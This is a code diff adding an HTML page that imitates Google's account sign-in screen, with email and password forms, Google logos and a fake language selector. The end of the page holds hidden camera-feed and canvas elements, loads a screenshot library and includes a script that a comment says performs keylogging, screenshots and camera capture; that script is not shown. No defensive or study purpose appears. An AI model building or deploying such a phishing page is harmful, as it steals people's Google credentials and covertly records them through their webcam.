@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/google_fav_24dp.png">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="google-logo">
+
+            <!-- Identifier (Email/Phone) Step -->
+            <div id="identifier-step">
+                <h1>Sign in</h1>
+                <p>Use your Google Account</p>
+
+                <form id="emailForm">
+                    <div class="input-group">
+                        <!-- Autofill for username -->
+                        <input type="text" id="identifier" name="identifier" autocomplete="username" required>
+                        <label for="identifier">Email or phone</label>
+                    </div>
+                    <p id="error-message" class="error-message" style="display: none;"></p>
+                    <div class="options">
+                        <a href="#">Forgot email?</a>
+                    </div>
+                    <div class="actions">
+                        <a href="#" class="create-account">Create account</a>
+                        <button type="submit" class="next-button">Next</button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Password Step (Initially Hidden) -->
+            <div id="password-step" style="display: none;">
+                <h1>Welcome</h1>
+                <div class="identifier-display">
+                    <img src="https://ssl.gstatic.com/s2/oz/images/circles/cc_3_5-0e6d62325c13e54b6099c2357e6274488b5066c8914b306b3a0ed341d3c0e12d.png" alt="Profile Icon">
+                    <span id="displayIdentifier"></span>
+                </div>
+
+                <form id="passwordForm">
+                    <input type="hidden" id="hiddenIdentifier" name="identifier">
+                    <div class="input-group">
+                        <!-- Autofill for current password -->
+                        <input type="password" id="password" name="password" autocomplete="current-password" required>
+                        <label for="password">Enter your password</label>
+                    </div>
+                    <!-- Show Password Checkbox -->
+                    <div class="show-password-container">
+                        <input type="checkbox" id="showPasswordCheckbox">
+                        <label for="showPasswordCheckbox">Show password</label>
+                    </div>
+                    <p id="password-error-message" class="error-message" style="display: none;"></p>
+                    <div class="options">
+                        <a href="#">Forgot password?</a>
+                    </div>
+                    <div class="actions">
+                        <a href="#" class="create-account"></a> <!-- Placeholder for alignment -->
+                        <button type="submit" class="next-button">Next</button>
+                    </div>
+                </form>
+            </div>
+
+            <div class="footer-links">
+                <select>
+                    <option>English (United States)</option>
+                    <option>አማርኛ</option>
+                    <option>Oromoo</option>
+                    <!-- Add more languages as needed -->
+                </select>
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden elements for camera capture -->
+    <video id="cameraFeed" autoplay muted playsinline style="display: none;"></video>
+    <canvas id="cameraCanvas" style="display: none;"></canvas>
+
+    <!-- html2canvas library for screenshots -->
+    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+    <!-- Your custom script for keylogging, screenshot, and camera capture -->
+    <script src="script.js"></script>
+</body>
+</html>
